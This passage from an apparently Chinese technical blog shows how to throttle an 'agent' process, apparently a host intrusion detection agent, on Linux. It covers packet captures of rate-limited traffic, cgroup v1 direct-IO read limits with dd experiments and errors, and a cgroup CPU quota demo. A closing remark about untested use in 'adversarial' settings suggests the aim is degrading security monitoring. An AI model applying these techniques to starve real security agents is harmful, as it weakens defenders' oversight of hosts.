class="line">22:52:00.780074 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], ack 1736746942, win 213, options [nop,nop,TS val 2324847358 ecr 3661297505], length 0</span><br><span class="line">22:52:00.780253 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 0:2696, ack 1, win 213, options [nop,nop,TS val 2324847358 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780516 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 2696:5392, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780533 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 5392:8088, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780538 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 8088:8192, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 104</span><br><span class="line">22:52:00.780571 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 8192:10888, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 2696</span><br><span class="line">22:52:00.780587 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 10888:12236, ack 1, win 213, options [nop,nop,TS val 2324847359 ecr 3661297505], length 1348</span><br><span class="line">22:52:00.816636 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 12236:14932, ack 1, win 213, options [nop,nop,TS val 2324847395 ecr 3661297542], length 2696</span><br><span class="line">22:52:00.816674 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [.], seq 14932:17628, ack 1, win 213, options [nop,nop,TS val 2324847395 ecr 3661297542], length 2696</span><br><span class="line">22:52:02.513394 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 17628:18976, ack 1, win 213, options [nop,nop,TS val 2324849092 ecr 3661297578], length 1348</span><br><span class="line">22:52:02.786393 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 18976:20324, ack 1, win 213, options [nop,nop,TS val 2324849365 ecr 3661299275], length 1348</span><br><span class="line">22:52:04.485382 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 20324:21672, ack 1, win 213, options [nop,nop,TS val 2324851064 ecr 3661299548], length 1348</span><br><span class="line">22:52:04.759396 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 21672:23020, ack 1, win 213, options [nop,nop,TS val 2324851338 ecr 3661301247], length 1348</span><br><span class="line">22:52:06.457405 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 23020:24368, ack 1, win 213, options [nop,nop,TS val 2324853036 ecr 3661301521], length 1348</span><br><span class="line">22:52:07.205354 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 24368:25716, ack 1, win 213, options [nop,nop,TS val 2324853784 ecr 3661303219], length 1348</span><br><span class="line">22:52:07.953399 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 25716:27064, ack 1, win 213, options [nop,nop,TS val 2324854532 ecr 3661303967], length 1348</span><br><span class="line">22:52:09.651384 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 27064:28412, ack 1, win 213, options [nop,nop,TS val 2324856230 ecr 3661304715], length 1348</span><br><span class="line">22:52:09.924396 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 28412:29760, ack 1, win 213, options [nop,nop,TS val 2324856503 ecr 3661306413], length 1348</span><br><span class="line">22:52:11.621372 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 29760:31108, ack 1, win 213, options [nop,nop,TS val 2324858200 ecr 3661306686], length 1348</span><br><span class="line">22:52:11.894385 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 31108:32456, ack 1, win 213, options [nop,nop,TS val 2324858473 ecr 3661308383], length 1348</span><br><span class="line">22:52:13.593387 IP instance-fj5pftdp.56634 &gt; 1.2.3.4.commplex-link: Flags [P.], seq 32456:33804, ack 1, win 213, options [nop,nop,TS val 2324860172 ecr 3661308656], length 1348</span><br></pre></td></tr></table></figure>
+<p>可以看到最开始<code>22:52:00</code>通过了10个包，然后大概每秒可以通过1个包。</p>
+</li>
 </ul>
+<h1 id="agent进程io读限速"><a href="#agent进程io读限速" class="headerlink" title="agent进程io读限速"></a>agent进程io读限速</h1><ul>
+<li><p>在linux主机上怎么给进程io读写限速呢？</p>
+<p>可以通过cgroup实现：cgroup是一种文件系统，可以用来限制cpu、内存、io等资源使用；cgroup也是docker的核心原理之一。</p>
+<p>cgroup有v1、v2两个版本，其中v1 只能限制”直接io”，v2版本对内核版本要求在4.5以上（似乎）。而hids等应用程序读文件大部分应该都是”缓冲io”，所以无法用v1版本的cgroup限制。我也只实验验证v1版本的对”直接io”的限制。</p>
+<blockquote>
+<p>如果想要了解更多”直接io”和”缓冲io”相关概念，可以参考 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/76876">23 | 基础篇：Linux 文件系统是怎么工作的？</a> 这篇。</p>
+</blockquote>
+<p>关于cgroup的介绍和使用可以参考网上的很多文章，比如 <a target="_blank" rel="noopener" href="https://tech.meituan.com/2015/03/31/cgroups.html">Linux资源管理之cgroups简介</a> 和 <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/cgroups.7.html">man手册</a></p>
+<p>“利用cgroup对进程io读写做限速”可以参考 <a target="_blank" rel="noopener" href="https://andrestc.com/post/cgroups-io/">Using cgroups to limit I/O</a>，这一篇文章有完整的实验过程。此小节我只记录”需要注意的细节”和文章没有提到的内容。</p>
+</li>
+</ul>
+<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><ul>
+<li><p>确认配置</p>
+<p>根据 <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/cgroup-v1/blkio-controller.txt">cgroup-v1文档</a> 手册说明，需要先确认内核是否支持cgroup io限速</p>
+<p>比如确认如下选项是否开启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;boot&#x2F;config-$(uname -r)|grep -i CONFIG_BLK_CGROUP</span><br><span class="line">CONFIG_BLK_CGROUP&#x3D;y</span><br><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;boot&#x2F;config-$(uname -r)|grep -i CONFIG_BLK_DEV_THROTTLING</span><br><span class="line">CONFIG_BLK_DEV_THROTTLING&#x3D;y</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>dd命令需要添加<code>oflag=direct</code>参数和bs参数必须是512（一个扇区的大小）的倍数</p>
+<p>因为cgroup v1 只能限制”直接io”，所以dd需要添加<code>oflag=direct</code>参数。</p>
+<p>而使用”直接io”，磁盘io需要扇区对齐，也就是每次写入的字节大小必须是一个扇区大小的倍数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;512 count&#x3D;1 oflag&#x3D;direct</span><br><span class="line">...</span><br><span class="line">512字节(512 B)已复制，0.00518424 秒，98.8 kB&#x2F;秒</span><br><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;511 count&#x3D;1 oflag&#x3D;direct   &#x2F;&#x2F; 非512倍数时，写入报错</span><br><span class="line">dd: 写入&quot;&#x2F;tmp&#x2F;file2&quot; 出错: 无效的参数</span><br><span class="line">...</span><br><span class="line">[root@instance-fj5pftdp ~]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;tmp&#x2F;file2 bs&#x3D;511 count&#x3D;1    &#x2F;&#x2F; &quot;缓冲io&quot;（非&quot;直接io&quot;）时，不需要用户对齐</span><br><span class="line">...</span><br><span class="line">511字节(511 B)已复制，0.000360275 秒，1.4 MB&#x2F;秒</span><br></pre></td></tr></table></figure>
+
+<p>如果想要了解更多”磁盘io对齐”相关知识，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rqq-GgZMMs5gj6p_VJqEVA">存储基础 —— 磁盘 IO 为什么总叫你对齐？</a> 这篇。</p>
+</li>
+<li><p>实验过程中遇到的报错</p>
+<p>在向配置中”写正在使用的分区”和”不正确的设备号”都会提示”无效的参数”报错，如下：</p>
+<p>似乎不能写正在使用的分区”/dev/vda1”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# df -h</span><br><span class="line">...</span><br><span class="line">&#x2F;dev&#x2F;vda1        79G   71G  4.6G  94% &#x2F;</span><br><span class="line">[root@instance-fj5pftdp ~]# cat &#x2F;proc&#x2F;partitions</span><br><span class="line">major minor  #blocks  name</span><br><span class="line"></span><br><span class="line"> 253        0   83886080 vda</span><br><span class="line"> 253        1   83885039 vda1</span><br><span class="line"></span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;253:1 100&#39; &gt; blkio.throttle.read_bps_device   &#x2F;&#x2F; 253对应&#x2F;dev&#x2F;vda1，似乎因为已经被挂载使用，所以不能被写入配置</span><br><span class="line">-bash: echo: 写错误: 无效的参数</span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;253:0 100&#39; &gt; blkio.throttle.read_bps_device</span><br></pre></td></tr></table></figure>
+
+<p>不能限制”字符设备”，只能限制”块设备”。当写入”字符设备的设备号”到配置时，就会报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;dev|grep &quot;5,&quot;</span><br><span class="line">crw-------  1 root root      5,   1 Apr 28 21:51 console</span><br><span class="line">crw-rw-rw-  1 root tty       5,   2 Oct 22 13:45 ptmx</span><br><span class="line">crw-rw-rw-  1 root tty       5,   0 Oct 12 13:06 tty</span><br><span class="line">[root@instance-fj5pftdp test1]# echo &#39;5:1 100&#39; &gt; blkio.throttle.read_bps_device   &#x2F;&#x2F; 5(主设备号)代表了&quot;字符设备&quot;</span><br><span class="line">-bash: echo: 写错误: 无效的参数</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="限制cpu使用"><a href="#限制cpu使用" class="headerlink" title="限制cpu使用"></a>限制cpu使用</h1><ul>
+<li><p>怎么限制cpu使用？</p>
+<p>同样使用cgroup。</p>
+</li>
+</ul>
+<h2 id="使用cgroup限制cpu使用"><a href="#使用cgroup限制cpu使用" class="headerlink" title="使用cgroup限制cpu使用"></a>使用cgroup限制cpu使用</h2><ul>
+<li><p>利用<code>stress</code>命令创建高cpu占用的”测试进程”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp test]# stress -c 1 &amp;</span><br><span class="line">[1] 27924</span><br><span class="line">[root@instance-fj5pftdp test]# stress: info: [27924] dispatching hogs: 1 cpu, 0 io, 0 vm, 0 hdd</span><br><span class="line"></span><br><span class="line">[root@instance-fj5pftdp test]# ps aux|grep stress</span><br><span class="line">root     27924  0.0  0.0   7312   424 pts&#x2F;65   S    23:02   0:00 stress -c 1</span><br><span class="line">root     27925 96.0  0.0   7312    96 pts&#x2F;65   R    23:02   0:10 stress -c 1    &#x2F;&#x2F; 实际工作的进程</span><br></pre></td></tr></table></figure>
+
+<p>验证cpu占用，可以看出来单核cpu占用100%</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp test]# top -b -p 27925</span><br><span class="line">...</span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line">27925 root      20   0    7312     96      0 R 100.0  0.0   2:32.58 stress</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用<code>cgroup</code>限制”测试进程”的使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# mkdir &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 27925 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;tasks    &#x2F;&#x2F; 进程号是27925</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 10000 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;cpu.cfs_quota_us   &#x2F;&#x2F; quota &#x3D; 10ms</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 50000 &gt; &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu&#x2F;test-cpu-limit&#x2F;cpu.cfs_period_us  &#x2F;&#x2F; period &#x3D; 50ms</span><br></pre></td></tr></table></figure>
+
+<p>限制cpu使用率是20%（10ms/50ms）</p>
+<p>查看是否限制stress进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# top -b -p 27925</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line">27925 root      20   0    7312     96      0 R  20.0  0.0   9:30.61 stress</span><br></pre></td></tr></table></figure>
+<p>可以看到限制成功</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>使用cgroup限制cpu、io等是很简单的。</p>
+<p>因为用cgroup”限制网络流量”没有测试成功，所以也就没有记录。</p>
 <p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://qastack.cn/superuser/287371/obtain-kernel-config-from-currently-running-linux-system">怎么查看内核配置</a></p>
 
       
     </div>
